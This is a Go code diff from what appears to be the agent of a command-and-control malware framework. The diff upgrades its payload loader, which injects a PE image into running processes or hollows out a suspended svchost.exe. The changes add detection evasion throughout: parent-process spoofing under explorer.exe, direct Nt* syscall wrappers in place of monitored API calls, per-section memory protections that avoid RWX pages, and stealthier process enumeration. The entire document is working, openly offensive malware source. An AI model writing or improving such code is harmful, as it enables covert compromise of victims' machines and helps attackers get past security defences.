@@ -10,6 +10,7 @@ import (
 	"unsafe"
 
 	"golang.org/x/sys/windows"
+	"overlord-client/cmd/agent/evasion"
 )
 
 // loadPayload tries injection methods in order of stealth:
@@ -17,6 +18,7 @@ import (
 //  2. Classic process hollowing into a new suspended svchost.
 //  3. Drop to disk and exec (noisiest, last resort).
 func loadPayload(payload []byte) {
+	evasion.InitLoader()
 	if err := injectExisting(payload); err == nil {
 		return
 	}
@@ -50,7 +52,6 @@ func hollowLoad(payload []byte) error {
 	sizeOfOptHdr := int(binary.LittleEndian.Uint16(payload[eLfanew+20:]))
 	sectTableOff := eLfanew + 24 + sizeOfOptHdr
 
-	// Relocation data directory (index 5) at optOff+160 for PE32+
 	relocRVA := uint32(0)
 	relocSize := uint32(0)
 	if optOff+168 <= len(payload) {
@@ -65,82 +66,68 @@ func hollowLoad(payload []byte) error {
 	hostExe := filepath.Join(sysRoot, "System32", "svchost.exe")
 	hostExePtr, _ := windows.UTF16PtrFromString(hostExe + " -k netsvcs")
 
-	var si windows.StartupInfo
-	si.Cb = uint32(unsafe.Sizeof(si))
+	// Build STARTUPINFOEX with PPID spoof: svchost will appear as a child of explorer.
+	var siEx windows.StartupInfoEx
+	siEx.StartupInfo.Cb = uint32(unsafe.Sizeof(siEx))
+	createFlags := uint32(windows.CREATE_SUSPENDED | windows.CREATE_NO_WINDOW)
+
+	explorerPID := findExplorerPID()
+	var attrList *windows.ProcThreadAttributeListContainer
+	if explorerPID != 0 {
+		parentHandle, err := windows.OpenProcess(windows.PROCESS_CREATE_PROCESS, false, explorerPID)
+		if err == nil {
+			defer windows.CloseHandle(parentHandle)
+			attrList, _ = windows.NewProcThreadAttributeList(1)
+			if attrList != nil {
+				defer attrList.Delete()
+				_ = attrList.Update(
+					windows.PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
+					unsafe.Pointer(&parentHandle),
+					unsafe.Sizeof(parentHandle),
+				)
+				siEx.ProcThreadAttributeList = attrList.List()
+				createFlags |= windows.EXTENDED_STARTUPINFO_PRESENT
+			}
+		}
+	}
+
 	var pi windows.ProcessInformation
 	if err := windows.CreateProcess(
 		nil, hostExePtr, nil, nil, false,
-		windows.CREATE_SUSPENDED|windows.CREATE_NO_WINDOW,
-		nil, nil, &si, &pi,
+		createFlags, nil, nil, &siEx.StartupInfo, &pi,
 	); err != nil {
 		return fmt.Errorf("CreateProcess: %w", err)
 	}
 	defer windows.CloseHandle(pi.Thread)
 	defer windows.CloseHandle(pi.Process)
 
-	ntdll := windows.NewLazySystemDLL("ntdll.dll")
-	k32 := windows.NewLazySystemDLL("kernel32.dll")
-
-	ntQueryInfo := ntdll.NewProc("NtQueryInformationProcess")
-	ntUnmap := ntdll.NewProc("NtUnmapViewOfSection")
-	virtualAllocEx := k32.NewProc("VirtualAllocEx")
-	writeProcessMemory := k32.NewProc("WriteProcessMemory")
-	readProcessMemory := k32.NewProc("ReadProcessMemory")
-	getThreadContext := k32.NewProc("GetThreadContext")
-	setThreadContext := k32.NewProc("SetThreadContext")
-
-	// Get PEB address
-	type processBasicInfo struct {
-		Reserved1       uintptr
-		PebBaseAddress  uintptr
-		Reserved2       [2]uintptr
-		UniqueProcessId uintptr
-		Reserved3       uintptr
+	// Get PEB base and current image base of the suspended process.
+	pebBase := evasion.ProcessPEB(uintptr(pi.Process))
+	if pebBase == 0 {
+		return fmt.Errorf("ProcessPEB failed")
 	}
-	var pbi processBasicInfo
-	ntQueryInfo.Call(
-		uintptr(pi.Process), 0,
-		uintptr(unsafe.Pointer(&pbi)),
-		unsafe.Sizeof(pbi), 0,
-	)
+	remoteBase := evasion.ProcessImageBase(uintptr(pi.Process))
 
-	// Read PEB.ImageBaseAddress (offset 0x10 in x64 PEB)
-	var remoteBase uint64
-	readProcessMemory.Call(
-		uintptr(pi.Process),
-		pbi.PebBaseAddress+0x10,
-		uintptr(unsafe.Pointer(&remoteBase)),
-		8, 0,
-	)
+	// Unmap the existing image from the target address space.
+	evasion.NtUnmapViewOfSection(uintptr(pi.Process), remoteBase)
 
-	// Unmap existing image
-	ntUnmap.Call(uintptr(pi.Process), uintptr(remoteBase))
-
-	// Allocate at preferred base first, fall back to any address
-	const memCommitReserve = 0x3000
-	const pageExecReadWrite = 0x40
-	allocBase, _, _ := virtualAllocEx.Call(
-		uintptr(pi.Process), uintptr(imageBase),
-		uintptr(sizeOfImage), memCommitReserve, pageExecReadWrite,
-	)
+	// Allocate RW memory at the preferred base; fall back to any address.
+	allocBase := evasion.NtAllocateVirtualMemoryAt(
+		uintptr(pi.Process), uintptr(imageBase), uintptr(sizeOfImage), windows.PAGE_READWRITE)
 	if allocBase == 0 {
-		allocBase, _, _ = virtualAllocEx.Call(
-			uintptr(pi.Process), 0,
-			uintptr(sizeOfImage), memCommitReserve, pageExecReadWrite,
-		)
+		allocBase = evasion.NtAllocateVirtualMemoryAt(
+			uintptr(pi.Process), 0, uintptr(sizeOfImage), windows.PAGE_READWRITE)
 	}
 	if allocBase == 0 {
-		return fmt.Errorf("VirtualAllocEx failed")
+		return fmt.Errorf("NtAllocateVirtualMemory failed")
 	}
 
-	// Write headers
-	writeProcessMemory.Call(
-		uintptr(pi.Process), allocBase,
-		uintptr(unsafe.Pointer(&payload[0])),
-		uintptr(sizeOfHeaders), 0,
-	)
+	// Write PE headers.
+	if !evasion.NtWriteRemote(uintptr(pi.Process), allocBase, payload[:sizeOfHeaders]) {
+		return fmt.Errorf("write headers failed")
+	}
 
-	// Write sections
+	// Write sections.
 	for i := 0; i < numSections; i++ {
 		secOff := sectTableOff + i*40
 		if secOff+40 > len(payload) {
@@ -149,53 +136,83 @@ func hollowLoad(payload []byte) error {
 		virtualAddr := binary.LittleEndian.Uint32(payload[secOff+12:])
 		rawSize := binary.LittleEndian.Uint32(payload[secOff+16:])
 		rawPtr := binary.LittleEndian.Uint32(payload[secOff+20:])
-		if rawSize == 0 || int(rawPtr)+int(rawSize) > len(payload) {
+		if rawSize == 0 || int(rawPtr+rawSize) > len(payload) {
 			continue
 		}
-		writeProcessMemory.Call(
-			uintptr(pi.Process),
+		evasion.NtWriteRemote(uintptr(pi.Process),
 			allocBase+uintptr(virtualAddr),
-			uintptr(unsafe.Pointer(&payload[rawPtr])),
-			uintptr(rawSize), 0,
-		)
+			payload[rawPtr:rawPtr+rawSize])
 	}
 
-	// Apply base relocations if the image wasn't loaded at its preferred base
+	// Apply base relocations (while allocation is still RW).
 	delta := int64(allocBase) - int64(imageBase)
 	if delta != 0 && relocRVA != 0 && relocSize != 0 {
 		relocRaw := rvaToRaw(payload, sectTableOff, numSections, relocRVA)
 		if relocRaw > 0 && relocRaw+int(relocSize) <= len(payload) {
-			applyRelocs(pi.Process, writeProcessMemory, readProcessMemory,
+			applyRelocs(pi.Process,
 				payload[relocRaw:relocRaw+int(relocSize)],
 				allocBase, delta)
 		}
 	}
 
-	// Update PEB.ImageBaseAddress
-	newBase := uint64(allocBase)
-	writeProcessMemory.Call(
-		uintptr(pi.Process), pbi.PebBaseAddress+0x10,
-		uintptr(unsafe.Pointer(&newBase)), 8, 0,
-	)
+	// Flip headers to read-only, then each section to its proper protection.
+	evasion.NtProtectRemote(uintptr(pi.Process), allocBase, uintptr(sizeOfHeaders), windows.PAGE_READONLY)
+	for i := 0; i < numSections; i++ {
+		secOff := sectTableOff + i*40
+		if secOff+40 > len(payload) {
+			break
+		}
+		virtualAddr := binary.LittleEndian.Uint32(payload[secOff+12:])
+		virtualSize := binary.LittleEndian.Uint32(payload[secOff+8:])
+		if virtualSize == 0 {
+			virtualSize = binary.LittleEndian.Uint32(payload[secOff+16:])
+		}
+		chars := binary.LittleEndian.Uint32(payload[secOff+36:])
+		prot := sectionProtect(chars)
+		evasion.NtProtectRemote(uintptr(pi.Process), allocBase+uintptr(virtualAddr), uintptr(virtualSize), prot)
+	}
 
-	// Get/Set thread context to redirect RIP to our entry point.
-	// AMD64 CONTEXT is 1232 bytes, must be 16-byte aligned.
+	// Update PEB.ImageBaseAddress to the new allocation.
+	var newBase [8]byte
+	binary.LittleEndian.PutUint64(newBase[:], uint64(allocBase))
+	evasion.NtWriteRemote(uintptr(pi.Process), pebBase+0x10, newBase[:])
+
+	// Redirect the main thread's RIP to our entry point.
+	// AMD64 CONTEXT is 1232 bytes and must be 16-byte aligned.
 	ctxRaw := make([]byte, 1232+16)
 	align := uintptr(16) - (uintptr(unsafe.Pointer(&ctxRaw[0])) & 15)
 	if align == 16 {
 		align = 0
 	}
 	ctx := ctxRaw[align : align+1232]
-	// ContextFlags at offset 48; CONTEXT_FULL for AMD64 = 0x10003F
-	binary.LittleEndian.PutUint32(ctx[48:], 0x10003f)
-	getThreadContext.Call(uintptr(pi.Thread), uintptr(unsafe.Pointer(&ctx[0])))
-	// Set Rip (offset 248 in AMD64 CONTEXT) to entry point
+	binary.LittleEndian.PutUint32(ctx[48:], 0x10003f) // ContextFlags = CONTEXT_FULL (AMD64)
+	evasion.NtGetContextThread(uintptr(pi.Thread), unsafe.Pointer(&ctx[0]))
 	entryAddr := allocBase + uintptr(entryRVA)
-	binary.LittleEndian.PutUint64(ctx[248:], uint64(entryAddr))
-	setThreadContext.Call(uintptr(pi.Thread), uintptr(unsafe.Pointer(&ctx[0])))
+	binary.LittleEndian.PutUint64(ctx[248:], uint64(entryAddr)) // Rip at offset 248
+	evasion.NtSetContextThread(uintptr(pi.Thread), unsafe.Pointer(&ctx[0]))
 
 	windows.ResumeThread(pi.Thread)
 	return nil
+}
+
+// sectionProtect maps PE section characteristic flags to a Windows page protection constant.
+func sectionProtect(chars uint32) uint32 {
+	const (
+		imgX = 0x20000000 // IMAGE_SCN_MEM_EXECUTE
+		imgW = 0x80000000 // IMAGE_SCN_MEM_WRITE
+	)
+	exec := chars&imgX != 0
+	write := chars&imgW != 0
+	switch {
+	case exec && write:
+		return windows.PAGE_EXECUTE_READWRITE
+	case exec:
+		return windows.PAGE_EXECUTE_READ
+	case write:
+		return windows.PAGE_READWRITE
+	default:
+		return windows.PAGE_READONLY
+	}
 }
 
 // rvaToRaw converts a virtual address (RVA) to a raw file offset using the section table.
@@ -216,8 +233,8 @@ func rvaToRaw(payload []byte, sectTableOff, numSections int, rva uint32) int {
 }
 
 // applyRelocs patches base relocation entries in the remote process.
-func applyRelocs(process windows.Handle, write, read *windows.LazyProc,
-	relocData []byte, allocBase uintptr, delta int64) {
+func applyRelocs(process windows.Handle, relocData []byte, allocBase uintptr, delta int64) {
+	var buf [8]byte
 	pos := 0
 	for pos+8 <= len(relocData) {
 		blockRVA := binary.LittleEndian.Uint32(relocData[pos:])
@@ -235,10 +252,12 @@ func applyRelocs(process windows.Handle, write, read *windows.LazyProc,
 			relOff := entry & 0x0fff
 			if relType == 10 { // IMAGE_REL_BASED_DIR64
 				addr := allocBase + uintptr(blockRVA) + uintptr(relOff)
-				var orig uint64
-				read.Call(uintptr(process), addr, uintptr(unsafe.Pointer(&orig)), 8, 0)
-				orig = uint64(int64(orig) + delta)
-				write.Call(uintptr(process), addr, uintptr(unsafe.Pointer(&orig)), 8, 0)
+				if evasion.NtReadRemote(uintptr(process), addr, buf[:]) {
+					orig := binary.LittleEndian.Uint64(buf[:])
+					orig = uint64(int64(orig) + delta)
+					binary.LittleEndian.PutUint64(buf[:], orig)
+					evasion.NtWriteRemote(uintptr(process), addr, buf[:])
+				}
 			}
 		}
 		pos += int(blockSize)
@@ -285,7 +304,7 @@ func randName() string {
 }
 
 // injectExisting finds a running low-risk host process and injects the payload
-// PE into it using NtCreateThreadEx — no new process event is generated.
+// PE into it — no new process event is generated.
 func injectExisting(payload []byte) error {
 	if len(payload) < 0x40 || payload[0] != 0x4d || payload[1] != 0x5a {
 		return fmt.Errorf("not a PE")
@@ -313,42 +332,27 @@ func injectExisting(payload []byte) error {
 		return err
 	}
 
-	proc, err := windows.OpenProcess(
-		windows.PROCESS_CREATE_THREAD|windows.PROCESS_VM_OPERATION|
-			windows.PROCESS_VM_WRITE|windows.PROCESS_VM_READ|windows.PROCESS_QUERY_INFORMATION,
-		false, pid)
+	const injectAccess = windows.PROCESS_CREATE_THREAD | windows.PROCESS_VM_OPERATION |
+		windows.PROCESS_VM_WRITE | windows.PROCESS_VM_READ | windows.PROCESS_QUERY_INFORMATION
+	proc, err := windows.OpenProcess(injectAccess, false, pid)
 	if err != nil {
 		return fmt.Errorf("OpenProcess: %w", err)
 	}
 	defer windows.CloseHandle(proc)
 
-	ntdll := windows.NewLazySystemDLL("ntdll.dll")
-	k32 := windows.NewLazySystemDLL("kernel32.dll")
-	ntCreateThread := ntdll.NewProc("NtCreateThreadEx")
-	virtualAllocEx := k32.NewProc("VirtualAllocEx")
-	writeProcessMemory := k32.NewProc("WriteProcessMemory")
-	readProcessMemory := k32.NewProc("ReadProcessMemory")
-
-	const memCommitReserve = 0x3000
-	const pageExecReadWrite = 0x40
-
-	allocBase, _, _ := virtualAllocEx.Call(
-		uintptr(proc), uintptr(imageBase),
-		uintptr(sizeOfImage), memCommitReserve, pageExecReadWrite,
-	)
+	// Allocate RW at preferred base, fall back to any address.
+	allocBase := evasion.NtAllocateVirtualMemoryAt(
+		uintptr(proc), uintptr(imageBase), uintptr(sizeOfImage), windows.PAGE_READWRITE)
 	if allocBase == 0 {
-		allocBase, _, _ = virtualAllocEx.Call(
-			uintptr(proc), 0,
-			uintptr(sizeOfImage), memCommitReserve, pageExecReadWrite,
-		)
+		allocBase = evasion.NtAllocateVirtualMemoryAt(
+			uintptr(proc), 0, uintptr(sizeOfImage), windows.PAGE_READWRITE)
 	}
 	if allocBase == 0 {
-		return fmt.Errorf("VirtualAllocEx failed in target")
+		return fmt.Errorf("NtAllocateVirtualMemory failed in target")
 	}
 
-	writeProcessMemory.Call(uintptr(proc), allocBase,
-		uintptr(unsafe.Pointer(&payload[0])), uintptr(sizeOfHeaders), 0)
-
+	// Write PE headers and sections while memory is RW.
+	evasion.NtWriteRemote(uintptr(proc), allocBase, payload[:sizeOfHeaders])
 	for i := 0; i < numSections; i++ {
 		secOff := sectTableOff + i*40
 		if secOff+40 > len(payload) {
@@ -357,40 +361,44 @@ func injectExisting(payload []byte) error {
 		va := binary.LittleEndian.Uint32(payload[secOff+12:])
 		rawSz := binary.LittleEndian.Uint32(payload[secOff+16:])
 		rawPtr := binary.LittleEndian.Uint32(payload[secOff+20:])
-		if rawSz == 0 || int(rawPtr)+int(rawSz) > len(payload) {
+		if rawSz == 0 || int(rawPtr+rawSz) > len(payload) {
 			continue
 		}
-		writeProcessMemory.Call(uintptr(proc), allocBase+uintptr(va),
-			uintptr(unsafe.Pointer(&payload[rawPtr])), uintptr(rawSz), 0)
+		evasion.NtWriteRemote(uintptr(proc), allocBase+uintptr(va), payload[rawPtr:rawPtr+rawSz])
 	}
 
+	// Apply relocations while still RW.
 	delta := int64(allocBase) - int64(imageBase)
 	if delta != 0 && relocRVA != 0 && relocSize != 0 {
 		relocRaw := rvaToRaw(payload, sectTableOff, numSections, relocRVA)
 		if relocRaw > 0 && relocRaw+int(relocSize) <= len(payload) {
-			applyRelocs(proc, writeProcessMemory, readProcessMemory,
-				payload[relocRaw:relocRaw+int(relocSize)], allocBase, delta)
+			applyRelocs(proc, payload[relocRaw:relocRaw+int(relocSize)], allocBase, delta)
 		}
 	}
 
+	// Flip to per-section protections (no RWX allocation at rest).
+	evasion.NtProtectRemote(uintptr(proc), allocBase, uintptr(sizeOfHeaders), windows.PAGE_READONLY)
+	for i := 0; i < numSections; i++ {
+		secOff := sectTableOff + i*40
+		if secOff+40 > len(payload) {
+			break
+		}
+		virtualAddr := binary.LittleEndian.Uint32(payload[secOff+12:])
+		virtualSize := binary.LittleEndian.Uint32(payload[secOff+8:])
+		if virtualSize == 0 {
+			virtualSize = binary.LittleEndian.Uint32(payload[secOff+16:])
+		}
+		chars := binary.LittleEndian.Uint32(payload[secOff+36:])
+		prot := sectionProtect(chars)
+		evasion.NtProtectRemote(uintptr(proc), allocBase+uintptr(virtualAddr), uintptr(virtualSize), prot)
+	}
+
 	entryAddr := allocBase + uintptr(entryRVA)
-	var threadHandle uintptr
-	r, _, _ := ntCreateThread.Call(
-		uintptr(unsafe.Pointer(&threadHandle)), // ThreadHandle
-		0x1FFFFF,                               // DesiredAccess (THREAD_ALL_ACCESS)
-		0,                                      // ObjectAttributes
-		uintptr(proc),                          // ProcessHandle
-		entryAddr,                              // StartRoutine
-		0,                                      // Argument
-		0,                                      // CreateFlags (0 = run immediately)
-		0, 0, 0, 0,                             // ZeroBits, StackSize, MaxStackSize, AttributeList
-	)
-	if r != 0 {
-		return fmt.Errorf("NtCreateThreadEx: status 0x%x", r)
+	th := evasion.NtCreateThreadEx(uintptr(proc), entryAddr)
+	if th == 0 {
+		return fmt.Errorf("NtCreateThreadEx failed")
 	}
-	if threadHandle != 0 {
-		windows.CloseHandle(windows.Handle(threadHandle))
-	}
+	windows.CloseHandle(windows.Handle(th))
 	return nil
 }
 
@@ -406,44 +414,85 @@ var candidateProcesses = []string{
 	"dllhost.exe",
 }
 
-// findHostPID returns the PID of the first running candidate process owned by
-// the current user that we can open with VM + thread rights.
-func findHostPID() (uint32, error) {
-	snap, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0)
-	if err != nil {
-		return 0, err
+// iterProcs enumerates all accessible process handles via NtGetNextProcess,
+// calling fn for each. fn returns false to stop early; each handle is closed automatically.
+func iterProcs(access uint32, fn func(windows.Handle) bool) {
+	var prev uintptr
+	for {
+		cur := evasion.NtGetNextProcess(prev, access)
+		if prev != 0 {
+			windows.CloseHandle(windows.Handle(prev))
+		}
+		if cur == 0 {
+			break
+		}
+		if !fn(windows.Handle(cur)) {
+			windows.CloseHandle(windows.Handle(cur))
+			break
+		}
+		prev = cur
 	}
-	defer windows.CloseHandle(snap)
+}
 
-	var entry windows.ProcessEntry32
-	entry.Size = uint32(unsafe.Sizeof(entry))
-	if err := windows.Process32First(snap, &entry); err != nil {
-		return 0, err
+// findHostPID returns the PID of the first running candidate process that
+// we can open with VM + thread rights.
+func findHostPID() (uint32, error) {
+	type pe struct {
+		pid  uint32
+		name string
 	}
+	var procs []pe
+	buf := make([]uint16, windows.MAX_PATH)
+
+	iterProcs(windows.PROCESS_QUERY_LIMITED_INFORMATION, func(h windows.Handle) bool {
+		size := uint32(len(buf))
+		if windows.QueryFullProcessImageName(h, 0, &buf[0], &size) != nil {
+			return true
+		}
+		pid := evasion.ProcessPID(uintptr(h))
+		if pid != 0 {
+			name := filepath.Base(windows.UTF16ToString(buf[:size]))
+			procs = append(procs, pe{pid, name})
+		}
+		return true
+	})
+
+	const injectAccess = uint32(windows.PROCESS_CREATE_THREAD | windows.PROCESS_VM_OPERATION |
+		windows.PROCESS_VM_WRITE | windows.PROCESS_QUERY_INFORMATION)
 
 	for _, candidate := range candidateProcesses {
-		// Reset snapshot scan for each candidate.
-		entry.Size = uint32(unsafe.Sizeof(entry))
-		_ = windows.Process32First(snap, &entry)
-		for {
-			name := windows.UTF16ToString(entry.ExeFile[:])
-			if equalFold(name, candidate) {
-				// Quick open-test to see if we have access.
-				h, err := windows.OpenProcess(
-					windows.PROCESS_CREATE_THREAD|windows.PROCESS_VM_OPERATION|
-						windows.PROCESS_VM_WRITE|windows.PROCESS_QUERY_INFORMATION,
-					false, entry.ProcessID)
+		for _, p := range procs {
+			if equalFold(p.name, candidate) {
+				h, err := windows.OpenProcess(injectAccess, false, p.pid)
 				if err == nil {
 					windows.CloseHandle(h)
-					return entry.ProcessID, nil
+					return p.pid, nil
 				}
-			}
-			if windows.Process32Next(snap, &entry) != nil {
-				break
 			}
 		}
 	}
 	return 0, fmt.Errorf("no suitable host process found")
+}
+
+// findExplorerPID returns the PID of the first explorer.exe instance accessible
+// to the current user, used for PPID spoofing.
+func findExplorerPID() uint32 {
+	var pid uint32
+	buf := make([]uint16, windows.MAX_PATH)
+
+	iterProcs(windows.PROCESS_QUERY_LIMITED_INFORMATION, func(h windows.Handle) bool {
+		size := uint32(len(buf))
+		if windows.QueryFullProcessImageName(h, 0, &buf[0], &size) != nil {
+			return true
+		}
+		name := filepath.Base(windows.UTF16ToString(buf[:size]))
+		if equalFold(name, "explorer.exe") {
+			pid = evasion.ProcessPID(uintptr(h))
+			return false // stop
+		}
+		return true
+	})
+	return pid
 }
 
 // stompFileTime copies kernel32.dll timestamps onto path to blend with system files.
